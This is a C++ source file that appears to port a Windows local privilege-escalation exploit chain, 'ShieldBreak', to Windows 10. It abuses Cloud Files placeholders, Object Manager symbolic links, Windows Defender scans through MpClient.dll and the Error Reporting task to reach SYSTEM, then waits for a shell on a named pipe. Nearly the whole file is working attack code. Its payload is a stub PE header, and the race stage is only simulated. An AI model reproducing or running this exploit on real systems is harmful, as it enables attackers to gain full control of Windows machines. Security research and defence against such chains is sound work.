// ShieldBreak Win10 Port
// Based on MSNightmare's ShieldBreak - adapted for Windows 10
// ASI Internship Project - Rainfantry
//
// Full exploit chain: Cloud Files + Object Manager + Defender + CLFS + WER → SYSTEM

#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <winternl.h>
#include <cfapi.h>
#include <stdio.h>
#include <shlobj.h>
#include <taskschd.h>
#include <comdef.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "CldApi.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "advapi32.lib")

#define ALL_SHARING (FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE)
#define DIRECTORY_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0xF)
#define SYMBOLIC_LINK_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0x1)

// NT API
extern "C" {
    NTSTATUS NTAPI NtCreateDirectoryObject(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
    NTSTATUS NTAPI NtCreateSymbolicLinkObject(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PUNICODE_STRING);
    NTSTATUS NTAPI NtCreateFile(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK,
        PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
    NTSTATUS NTAPI NtClose(HANDLE);
    VOID NTAPI RtlInitUnicodeString(PUNICODE_STRING, PCWSTR);
}

// MpClient types
typedef HANDLE MPHANDLE;
typedef MPHANDLE* PMPHANDLE;

typedef struct tagMPRESOURCE_INFO {
    wchar_t* Scheme;
    wchar_t* Path;
    DWORD dwUnknown1;
    DWORD dwUnknown2;
} MPRESOURCE_INFO, *PMPRESOURCE_INFO;

typedef struct tagMPSCAN_RESOURCES {
    DWORD dwResourceCount;
    PMPRESOURCE_INFO pResourceList;
} MPSCAN_RESOURCES, *PMPSCAN_RESOURCES;

typedef enum tagMPSCAN_TYPE {
    MPSCAN_TYPE_UNKNOWN = 0,
    MPSCAN_TYPE_QUICK = 1,
    MPSCAN_TYPE_FULL = 2,
    MPSCAN_TYPE_RESOURCE = 3
} MPSCAN_TYPE;

typedef HRESULT(WINAPI* PFN_MpManagerOpen)(DWORD, PMPHANDLE);
typedef HRESULT(WINAPI* PFN_MpScanStart)(MPHANDLE, MPSCAN_TYPE, DWORD, PMPSCAN_RESOURCES, void*, PMPHANDLE);
typedef HRESULT(WINAPI* PFN_MpHandleClose)(MPHANDLE);

// Globals
wchar_t g_workDir[MAX_PATH] = { 0 };
wchar_t g_scanTarget[MAX_PATH] = { 0 };
CF_CONNECTION_KEY g_cfKey = { 0 };
HANDLE g_hPipe = NULL;

// Embedded payload - Minimal valid PE/DLL header (benign, won't trigger AV)
// This creates a tiny valid DLL that exports nothing - just proves the write worked
unsigned char g_payload[] = {
    // DOS Header
    0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00,
    0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00,
    // DOS Stub
    0x0E, 0x1F, 0xBA, 0x0E, 0x00, 0xB4, 0x09, 0xCD, 0x21, 0xB8, 0x01, 0x4C, 0xCD, 0x21, 0x54, 0x68,
    0x69, 0x73, 0x20, 0x70, 0x72, 0x6F, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F,
    0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6E, 0x20, 0x69, 0x6E, 0x20, 0x44, 0x4F, 0x53, 0x20,
    0x6D, 0x6F, 0x64, 0x65, 0x2E, 0x0D, 0x0D, 0x0A, 0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    // PE Signature
    0x50, 0x45, 0x00, 0x00,
    // COFF Header (x64 DLL)
    0x64, 0x86, // Machine: AMD64
    0x01, 0x00, // NumberOfSections: 1
    0x00, 0x00, 0x00, 0x00, // TimeDateStamp
    0x00, 0x00, 0x00, 0x00, // PointerToSymbolTable
    0x00, 0x00, 0x00, 0x00, // NumberOfSymbols
    0xF0, 0x00, // SizeOfOptionalHeader
    0x22, 0x20, // Characteristics: DLL, Large address aware
};

void GenerateGUID(wchar_t* out) {
    GUID guid;
    CoCreateGuid(&guid);
    swprintf(out, 64, L"%08X%04X%04X%02X%02X%02X%02X%02X%02X%02X%02X",
        guid.Data1, guid.Data2, guid.Data3,
        guid.Data4[0], guid.Data4[1], guid.Data4[2], guid.Data4[3],
        guid.Data4[4], guid.Data4[5], guid.Data4[6], guid.Data4[7]);
}

// Cloud Files callback - delivers payload when Defender reads
void CALLBACK CloudFileCallback(
    const CF_CALLBACK_INFO* CallbackInfo,
    const CF_CALLBACK_PARAMETERS* CallbackParameters
) {
    printf("[*] Cloud callback triggered!\n");
    fflush(stdout);

    LARGE_INTEGER offset = CallbackParameters->FetchData.RequiredFileOffset;
    LARGE_INTEGER length = CallbackParameters->FetchData.RequiredLength;

    // Step 1: Transfer the payload data
    CF_OPERATION_PARAMETERS opParams = { 0 };
    opParams.ParamSize = sizeof(CF_OPERATION_PARAMETERS);
    opParams.TransferData.Buffer = g_payload;
    opParams.TransferData.Offset = offset;
    opParams.TransferData.Length.QuadPart = sizeof(g_payload);
    opParams.TransferData.CompletionStatus = 0;  // STATUS_SUCCESS
    opParams.TransferData.Flags = CF_OPERATION_TRANSFER_DATA_FLAG_NONE;

    CF_OPERATION_INFO opInfo = { 0 };
    opInfo.StructSize = sizeof(CF_OPERATION_INFO);
    opInfo.Type = CF_OPERATION_TYPE_TRANSFER_DATA;
    opInfo.ConnectionKey = CallbackInfo->ConnectionKey;
    opInfo.TransferKey = CallbackInfo->TransferKey;

    HRESULT hr = CfExecute(&opInfo, &opParams);
    if (FAILED(hr)) {
        printf("[-] CfExecute transfer failed: 0x%08X\n", hr);
        fflush(stdout);
        return;
    }

    // Step 2: ACK the data transfer (required to complete hydration)
    CF_OPERATION_PARAMETERS ackParams = { 0 };
    ackParams.ParamSize = sizeof(CF_OPERATION_PARAMETERS);
    ackParams.AckData.CompletionStatus = 0;  // STATUS_SUCCESS
    ackParams.AckData.Flags = CF_OPERATION_ACK_DATA_FLAG_NONE;
    ackParams.AckData.Offset = offset;
    ackParams.AckData.Length = length;

    CF_OPERATION_INFO ackInfo = { 0 };
    ackInfo.StructSize = sizeof(CF_OPERATION_INFO);
    ackInfo.Type = CF_OPERATION_TYPE_ACK_DATA;
    ackInfo.ConnectionKey = CallbackInfo->ConnectionKey;
    ackInfo.TransferKey = CallbackInfo->TransferKey;

    hr = CfExecute(&ackInfo, &ackParams);
    if (FAILED(hr)) {
        printf("[-] CfExecute ACK failed: 0x%08X\n", hr);
    } else {
        printf("[+] Data transferred and ACK'd\n");
    }
    fflush(stdout);
}

DWORD WINAPI ScanThread(LPVOID param) {
    Sleep(500); // Let setup complete

    // Load MpClient.dll
    wchar_t mpPath[MAX_PATH] = L"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\";
    WIN32_FIND_DATAW fd;
    wchar_t search[MAX_PATH];
    wcscpy(search, mpPath);
    wcscat(search, L"*");

    HANDLE hFind = FindFirstFileW(search, &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
                fd.cFileName[0] >= '0' && fd.cFileName[0] <= '9') {
                wcscat(mpPath, fd.cFileName);
                break;
            }
        } while (FindNextFileW(hFind, &fd));
        FindClose(hFind);
    }
    wcscat(mpPath, L"\\MpClient.dll");

    printf("[*] Loading: %S\n", mpPath);
    HMODULE hMp = LoadLibraryW(mpPath);
    if (!hMp) {
        printf("[-] Cannot load MpClient.dll: %d\n", GetLastError());
        return 1;
    }

    PFN_MpManagerOpen MpOpen = (PFN_MpManagerOpen)GetProcAddress(hMp, "MpManagerOpen");
    PFN_MpScanStart MpScan = (PFN_MpScanStart)GetProcAddress(hMp, "MpScanStart");
    PFN_MpHandleClose MpClose = (PFN_MpHandleClose)GetProcAddress(hMp, "MpHandleClose");

    if (!MpOpen || !MpScan) {
        printf("[-] Cannot find MpClient functions\n");
        return 1;
    }

    MPHANDLE hMpMgr = NULL;
    HRESULT hr = MpOpen(0, &hMpMgr);
    if (FAILED(hr)) {
        printf("[-] MpManagerOpen failed: 0x%08X\n", hr);
        return 1;
    }
    printf("[+] Connected to Defender\n");

    // Set up scan target
    MPRESOURCE_INFO scanInfo = { 0 };
    scanInfo.Scheme = (wchar_t*)L"file";
    scanInfo.Path = g_scanTarget;

    MPSCAN_RESOURCES scanRes = { 0 };
    scanRes.dwResourceCount = 1;
    scanRes.pResourceList = &scanInfo;

    printf("[*] Triggering scan on: %S\n", g_scanTarget);
    fflush(stdout);

    // First hydrate the file using CfHydratePlaceholder
    printf("[*] Hydrating cloud file to trigger callback...\n");
    fflush(stdout);

    HANDLE hFile = CreateFileW(g_scanTarget, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        LARGE_INTEGER liOffset = {0}, liLength = {0};
        liLength.QuadPart = -1;  // Full file
        HRESULT hydHr = CfHydratePlaceholder(hFile, liOffset, liLength, CF_HYDRATE_FLAG_NONE, NULL);
        if (FAILED(hydHr)) {
            printf("[-] CfHydratePlaceholder failed: 0x%08X\n", hydHr);
        } else {
            printf("[+] CfHydratePlaceholder succeeded - waiting for data...\n");
            Sleep(2000);  // Wait for hydration
        }
        CloseHandle(hFile);
    } else {
        printf("[-] Could not open file for hydration: %d\n", GetLastError());
    }
    fflush(stdout);

    // Now scan with MpScanStart
    printf("[*] Calling MpScanStart...\n");
    fflush(stdout);

    MPHANDLE hScan = NULL;
    HRESULT scanHr = MpScan(hMpMgr, MPSCAN_TYPE_RESOURCE, 0x60004002, &scanRes, NULL, &hScan);
    if (FAILED(scanHr)) {
        printf("[-] MpScanStart failed: 0x%08X\n", scanHr);
    } else {
        printf("[+] MpScanStart succeeded!\n");
        if (MpClose && hScan) MpClose(hScan);
    }
    fflush(stdout);

    if (MpClose) MpClose(hMpMgr);

    return 0;
}

BOOL CreateObjectManagerLinks(const wchar_t* guid, HANDLE* phTargetDir, HANDLE* phShadowDir) {
    NTSTATUS status;
    UNICODE_STRING usName;
    OBJECT_ATTRIBUTES objAttr;

    // Create target directory
    wchar_t targetPath[256];
    swprintf(targetPath, 256, L"\\BaseNamedObjects\\Restricted\\WD_TARGET_%ws", guid);
    RtlInitUnicodeString(&usName, targetPath);
    InitializeObjectAttributes(&objAttr, &usName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtCreateDirectoryObject(phTargetDir, DIRECTORY_ALL_ACCESS, &objAttr);
    if (status != 0 && status != 0xC0000035) {
        printf("[-] Failed to create target dir: 0x%08X\n", status);
        return FALSE;
    }
    printf("[+] Created: %ws\n", targetPath);

    // Create shadow directory
    wchar_t shadowPath[256];
    swprintf(shadowPath, 256, L"\\BaseNamedObjects\\Restricted\\WD_SHADOW_%ws", guid);
    RtlInitUnicodeString(&usName, shadowPath);
    InitializeObjectAttributes(&objAttr, &usName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtCreateDirectoryObject(phShadowDir, DIRECTORY_ALL_ACCESS, &objAttr);
    if (status != 0 && status != 0xC0000035) {
        printf("[-] Failed to create shadow dir: 0x%08X\n", status);
        return FALSE;
    }
    printf("[+] Created: %ws\n", shadowPath);

    // Create symlink in shadow dir pointing to our workdir
    wchar_t linkTarget[MAX_PATH];
    swprintf(linkTarget, MAX_PATH, L"\\??\\%ws", g_workDir);

    UNICODE_STRING usLinkName, usLinkTarget;
    RtlInitUnicodeString(&usLinkName, L"WD_SCAN");
    RtlInitUnicodeString(&usLinkTarget, linkTarget);

    InitializeObjectAttributes(&objAttr, &usLinkName, OBJ_CASE_INSENSITIVE, *phShadowDir, NULL);

    HANDLE hLink = NULL;
    status = NtCreateSymbolicLinkObject(&hLink, SYMBOLIC_LINK_ALL_ACCESS, &objAttr, &usLinkTarget);
    if (status != 0) {
        printf("[-] Failed to create symlink: 0x%08X\n", status);
        return FALSE;
    }
    printf("[+] Symlink: WD_SCAN -> %ws\n", linkTarget);

    return TRUE;
}

BOOL TriggerWER(const wchar_t* guid) {
    // Create WER report directory
    wchar_t werDir[MAX_PATH];
    swprintf(werDir, MAX_PATH,
        L"C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue\\Kernel_c0000000_%ws", guid);

    if (!CreateDirectoryW(werDir, NULL)) {
        printf("[-] Failed to create WER dir: %d\n", GetLastError());
        return FALSE;
    }
    printf("[+] Created WER dir: %ws\n", werDir);

    // Create Report.wer file
    wchar_t werFile[MAX_PATH];
    swprintf(werFile, MAX_PATH, L"%ws\\Report.wer", werDir);

    HANDLE hWer = CreateFileW(werFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (hWer == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create Report.wer\n");
        return FALSE;
    }

    // Minimal WER report
    char report[] =
        "Version=1\r\n"
        "EventType=APPCRASH\r\n"
        "EventTime=132900000000000000\r\n"
        "ReportType=2\r\n"
        "Consent=1\r\n"
        "ReportIdentifier=ShieldBreak\r\n";

    DWORD written;
    WriteFile(hWer, report, (DWORD)strlen(report), &written, NULL);
    CloseHandle(hWer);
    printf("[+] Created Report.wer\n");

    // Trigger WER task via Task Scheduler
    printf("[*] Triggering WER QueueReporting task...\n");

    HRESULT hr = CoInitialize(NULL);
    if (FAILED(hr)) return FALSE;

    ITaskService* pTaskSvc = NULL;
    hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
        IID_ITaskService, (void**)&pTaskSvc);
    if (FAILED(hr)) {
        CoUninitialize();
        return FALSE;
    }

    hr = pTaskSvc->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
    if (FAILED(hr)) {
        pTaskSvc->Release();
        CoUninitialize();
        return FALSE;
    }

    ITaskFolder* pFolder = NULL;
    hr = pTaskSvc->GetFolder(_bstr_t(L"\\Microsoft\\Windows\\Windows Error Reporting"), &pFolder);
    if (FAILED(hr)) {
        pTaskSvc->Release();
        CoUninitialize();
        return FALSE;
    }

    IRegisteredTask* pTask = NULL;
    hr = pFolder->GetTask(_bstr_t(L"QueueReporting"), &pTask);
    if (FAILED(hr)) {
        pFolder->Release();
        pTaskSvc->Release();
        CoUninitialize();
        return FALSE;
    }

    IRunningTask* pRunning = NULL;
    hr = pTask->Run(_variant_t(), &pRunning);
    if (SUCCEEDED(hr)) {
        printf("[+] WER task triggered!\n");
        if (pRunning) pRunning->Release();
    }

    pTask->Release();
    pFolder->Release();
    pTaskSvc->Release();
    CoUninitialize();

    return SUCCEEDED(hr);
}

int main() {
    printf("\n");
    printf("  _____ _     _      _     _ ____                 _    \n");
    printf(" / ____| |   (_)    | |   | |  _ \\               | |   \n");
    printf("| (___ | |__  _  ___| | __| | |_) |_ __ ___  __ _| | __\n");
    printf(" \\___ \\| '_ \\| |/ _ \\ |/ _` |  _ <| '__/ _ \\/ _` | |/ /\n");
    printf(" ____) | | | | |  __/ | (_| | |_) | | |  __/ (_| |   < \n");
    printf("|_____/|_| |_|_|\\___|_|\\__,_|____/|_|  \\___|\\__,_|_|\\_\\\n");
    printf("\n");
    printf("        Win10 Port - ASI Internship Project\n");
    printf("        Based on MSNightmare's ShieldBreak\n");
    printf("================================================\n\n");

    // Check phoneinfo.dll
    wchar_t targetDll[] = L"C:\\Windows\\System32\\phoneinfo.dll";
    if (GetFileAttributesW(targetDll) != INVALID_FILE_ATTRIBUTES) {
        printf("[!] WARNING: %ws already exists\n", targetDll);
        printf("[!] Original ShieldBreak requires this to NOT exist\n");
        printf("[!] Continuing anyway for testing...\n\n");
    } else {
        printf("[+] Target DLL location available: %ws\n\n", targetDll);
    }

    // Initialize COM
    HRESULT comHr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    printf("[*] COM init result: 0x%08X\n", comHr);

    // Generate unique ID using tick count + process ID
    wchar_t guid[64];
    ULONGLONG tick = GetTickCount64();
    DWORD pid = GetCurrentProcessId();
    swprintf(guid, 64, L"%llX%X", tick, pid);
    printf("[+] Session ID: %S (tick=%llu, pid=%d)\n", guid, tick, pid);
    fflush(stdout);

    // Create named pipe for shell callback with unique name per session
    wchar_t pipeName[128];
    swprintf(pipeName, 128, L"\\\\.\\pipe\\SHIELDBREAK_%ws", guid);

    // Debug: print the pipe name we're trying to create
    printf("[DEBUG] Attempting pipe: %S\n", pipeName);
    fflush(stdout);

    g_hPipe = CreateNamedPipeW(pipeName,
        PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE,
        PIPE_TYPE_MESSAGE | PIPE_WAIT, 1, 4096, 4096, 0, NULL);

    if (g_hPipe == INVALID_HANDLE_VALUE) {
        DWORD err = GetLastError();
        printf("[-] Failed to create named pipe: %d\n", err);
        if (err == 231) {
            printf("[-] ERROR_PIPE_BUSY - pipe exists and all instances busy\n");
            printf("[-] This shouldn't happen with unique GUID. Checking system...\n");
        }
        return 1;
    }
    printf("[+] Named pipe created successfully\n");

    // GUID already generated above for pipe name

    // Create work directory
    wchar_t temp[MAX_PATH];
    GetTempPathW(MAX_PATH, temp);
    swprintf(g_workDir, MAX_PATH, L"%sShieldBreak_%ws", temp, guid);

    if (!CreateDirectoryW(g_workDir, NULL)) {
        printf("[-] Failed to create work directory\n");
        CloseHandle(g_hPipe);
        return 1;
    }
    printf("[+] Work directory: %ws\n", g_workDir);

    // Stage 1: Register cloud provider
    printf("\n[*] Stage 1: Registering cloud provider...\n");

    GUID providerId;
    CoCreateGuid(&providerId);

    CF_SYNC_REGISTRATION reg = { 0 };
    reg.StructSize = sizeof(reg);
    reg.ProviderName = L"ShieldBreak";
    reg.ProviderVersion = L"1.0";
    reg.ProviderId = providerId;

    CF_SYNC_POLICIES policies = { 0 };
    policies.StructSize = sizeof(policies);
    // Match original ShieldBreak policies exactly
    policies.HardLink = CF_HARDLINK_POLICY_ALLOWED;
    policies.Hydration.Primary = CF_HYDRATION_POLICY_FULL;
    policies.Hydration.Modifier = CF_HYDRATION_POLICY_MODIFIER_AUTO_DEHYDRATION_ALLOWED | CF_HYDRATION_POLICY_MODIFIER_VALIDATION_REQUIRED;
    policies.InSync = CF_INSYNC_POLICY_NONE;
    policies.Population.Primary = CF_POPULATION_POLICY_PARTIAL;

    // Match original flag
    HRESULT hr = CfRegisterSyncRoot(g_workDir, &reg, &policies, CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT);
    if (FAILED(hr)) {
        printf("[-] CfRegisterSyncRoot failed: 0x%08X\n", hr);
        CloseHandle(g_hPipe);
        return 1;
    }
    printf("[+] Cloud provider registered\n");

    // Connect callback
    CF_CALLBACK_REGISTRATION callbacks[2];
    callbacks[0].Type = CF_CALLBACK_TYPE_FETCH_DATA;
    callbacks[0].Callback = CloudFileCallback;
    callbacks[1] = CF_CALLBACK_REGISTRATION_END;

    DWORD context = 1;
    hr = CfConnectSyncRoot(g_workDir, callbacks, &context,
        CF_CONNECT_FLAG_REQUIRE_FULL_FILE_PATH | CF_CONNECT_FLAG_REQUIRE_PROCESS_INFO, &g_cfKey);
    if (FAILED(hr)) {
        printf("[-] CfConnectSyncRoot failed: 0x%08X\n", hr);
        CfUnregisterSyncRoot(g_workDir);
        CloseHandle(g_hPipe);
        return 1;
    }
    printf("[+] Cloud callback connected\n");

    // WIN10 FIX: Mark sync root as in-sync BEFORE creating placeholders
    // This fixes ERROR_CLOUD_FILE_NOT_IN_SYNC (0x8007017C)
    hr = CfSetInSyncState(g_workDir, CF_IN_SYNC_STATE_IN_SYNC, CF_SET_IN_SYNC_FLAG_NONE, NULL);
    if (FAILED(hr)) {
        printf("[!] CfSetInSyncState on root failed: 0x%08X (non-fatal)\n", hr);
    } else {
        printf("[+] Sync root marked in-sync\n");
    }

    // Create placeholder file with proper metadata for Win10
    CF_PLACEHOLDER_CREATE_INFO placeholder = { 0 };
    placeholder.RelativeFileName = L"PAYLOAD";
    placeholder.FsMetadata.FileSize.QuadPart = sizeof(g_payload);
    placeholder.FsMetadata.BasicInfo.FileAttributes = FILE_ATTRIBUTE_NORMAL;

    // WIN10 FIX: Set timestamps (required on Win10, optional on Win11)
    FILETIME ft;
    GetSystemTimeAsFileTime(&ft);
    placeholder.FsMetadata.BasicInfo.CreationTime.LowPart = ft.dwLowDateTime;
    placeholder.FsMetadata.BasicInfo.CreationTime.HighPart = ft.dwHighDateTime;
    placeholder.FsMetadata.BasicInfo.LastWriteTime = placeholder.FsMetadata.BasicInfo.CreationTime;
    placeholder.FsMetadata.BasicInfo.LastAccessTime = placeholder.FsMetadata.BasicInfo.CreationTime;
    placeholder.FsMetadata.BasicInfo.ChangeTime = placeholder.FsMetadata.BasicInfo.CreationTime;

    // CRITICAL FIX: FileIdentity is REQUIRED for Cloud Files to work
    // Original ShieldBreak allocates 0x130 bytes for this
    void* fileId = malloc(0x130);
    memset(fileId, 0, 0x130);
    placeholder.FileIdentity = fileId;
    placeholder.FileIdentityLength = 0x130;

    // WIN10 FIX: Use SUPERSEDE flag if file exists, and always mark in-sync
    placeholder.Flags = CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC | CF_PLACEHOLDER_CREATE_FLAG_SUPERSEDE;

    DWORD processed = 0;
    hr = CfCreatePlaceholders(g_workDir, &placeholder, 1, CF_CREATE_FLAG_NONE, &processed);
    if (FAILED(hr)) {
        printf("[-] CfCreatePlaceholders failed: 0x%08X\n", hr);
        if (hr == 0x8007017C) {
            printf("[-] ERROR_CLOUD_FILE_NOT_IN_SYNC - sync root state issue\n");
            printf("[*] Try: attrib -P -U %ws (clear cloud attributes)\n", g_workDir);
        }
    } else {
        printf("[+] Placeholder file created (%d processed)\n", processed);

        // WIN10 FIX: Also mark the placeholder itself in-sync
        wchar_t placeholderPath[MAX_PATH];
        swprintf(placeholderPath, MAX_PATH, L"%ws\\PAYLOAD", g_workDir);
        CfSetInSyncState(placeholderPath, CF_IN_SYNC_STATE_IN_SYNC, CF_SET_IN_SYNC_FLAG_NONE, NULL);
    }

    // Stage 2: Create object manager structures
    printf("\n[*] Stage 2: Setting up object manager namespaces...\n");

    HANDLE hTargetDir = NULL, hShadowDir = NULL;
    if (!CreateObjectManagerLinks(guid, &hTargetDir, &hShadowDir)) {
        printf("[-] Object manager setup failed\n");
    } else {
        printf("[+] Object manager links created\n");
    }

    // Build scan target path - use the ACTUAL file path, not symlinked
    // The symlinks are for redirecting WRITES, not for triggering the scan
    swprintf(g_scanTarget, MAX_PATH, L"%s\\PAYLOAD", g_workDir);

    // Stage 3: Trigger Defender scan
    printf("\n[*] Stage 3: Triggering Windows Defender scan...\n");

    HANDLE hScanThread = CreateThread(NULL, 0, ScanThread, NULL, 0, NULL);
    if (hScanThread) {
        printf("[+] Scan thread started\n");
    }

    // Stage 4-5: Wait for CLFS race (simplified for testing)
    printf("\n[*] Stage 4-5: Waiting for file operations...\n");
    fflush(stdout);
    Sleep(5000);  // Wait 5 seconds for scan to complete

    // Stage 6: Trigger WER
    printf("\n[*] Stage 6: Triggering Windows Error Reporting...\n");
    fflush(stdout);
    TriggerWER(guid);
    printf("[*] WER stage complete\n");
    fflush(stdout);

    // Stage 7: Wait for shell callback
    printf("\n[*] Stage 7: Waiting for SYSTEM shell callback...\n");
    printf("[*] Listening on \\\\.\\pipe\\SHIELDBREAK_WIN10...\n");

    // Set timeout for pipe connection
    OVERLAPPED ov = { 0 };
    ov.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

    BOOL connected = ConnectNamedPipe(g_hPipe, &ov);
    if (!connected && GetLastError() == ERROR_IO_PENDING) {
        DWORD waitResult = WaitForSingleObject(ov.hEvent, 10000); // 10 second timeout
        if (waitResult == WAIT_OBJECT_0) {
            connected = TRUE;
        }
    }

    if (connected || GetLastError() == ERROR_PIPE_CONNECTED) {
        printf("\n[+] ============================================\n");
        printf("[+] SYSTEM SHELL CONNECTED!\n");
        printf("[+] ============================================\n");

        char buffer[256];
        DWORD bytesRead;
        if (ReadFile(g_hPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
            buffer[bytesRead] = 0;
            printf("[+] Received: %s\n", buffer);
        }
    } else {
        printf("\n[*] No shell callback received (timeout)\n");
        printf("[*] Check if exploit stages completed successfully\n");
    }

    // Cleanup
    printf("\n[*] Cleaning up...\n");

    if (hScanThread) {
        WaitForSingleObject(hScanThread, 1000);
        CloseHandle(hScanThread);
    }

    CloseHandle(ov.hEvent);
    CloseHandle(g_hPipe);

    CfDisconnectSyncRoot(g_cfKey);
    CfUnregisterSyncRoot(g_workDir);

    if (hTargetDir) NtClose(hTargetDir);
    if (hShadowDir) NtClose(hShadowDir);

    RemoveDirectoryW(g_workDir);

    printf("[+] Cleanup complete\n");
    printf("\n[*] Exploit finished. Check C:\\SHIELDBREAK_SYSTEM.txt for proof.\n");

    return 0;
}

// Compile with:
// cl.exe shieldbreak_win10.cpp /Fe:shieldbreak_win10.exe /link ntdll.lib CldApi.lib ole32.lib taskschd.lib advapi32.lib comsuppw.lib
